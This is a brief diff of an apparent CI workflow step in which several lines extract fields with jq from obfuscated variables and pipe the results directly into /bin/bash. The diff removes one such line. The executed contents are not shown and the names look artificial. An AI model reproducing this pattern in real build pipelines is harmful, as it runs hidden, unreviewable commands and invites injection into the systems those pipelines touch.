@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$dc4" | jq -r .vhq7054 | /bin/bash
           echo $e8 | jq -r .us86 | /bin/bash
           echo $tt14287 | jq -r .qj98026 | /bin/bash
-          printf '%s' "$l7" | jq -r .rxp1 | /bin/bash
           printf '%s' "$jpp1303" | jq -r .mvlx738 | /bin/bash
 
       - name: Persist data
